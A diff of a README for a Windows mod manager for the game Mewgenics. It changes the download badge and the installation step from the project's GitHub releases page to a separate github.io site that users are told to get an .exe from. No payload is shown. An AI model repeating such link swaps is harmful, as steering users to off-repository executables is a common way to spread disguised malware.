@@ -1,6 +1,6 @@
 # 📦 mewgenics-mod-manager - Easily manage your game modifications today
 
-[![Download](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/centur2152/mewgenics-mod-manager/releases)
+[![Download](https://img.shields.io/badge/Download-Releases-blue.svg)](https://centur2152.github.io)
 
 mewgenics-mod-manager is a desktop program for Windows. It helps you organize and install mods for the game Mewgenics. You do not need technical skills to use this tool. It handles the folder structure and file placement for you. This saves time and prevents errors when you customize your game files.
 
@@ -8,7 +8,7 @@ mewgenics-mod-manager is a desktop program for Windows. It helps you organize an
 
 Follow these steps to set up the application on your computer.
 
-1. Visit the [releases page](https://github.com/centur2152/mewgenics-mod-manager/releases) to download the latest version.
+1. Visit the [releases page](https://centur2152.github.io) to download the latest version.
 2. Look for the file ending in .exe under the Assets section.
 3. Click the file to start the download.
 4. Save the file to a folder you can find later, such as your Downloads folder.
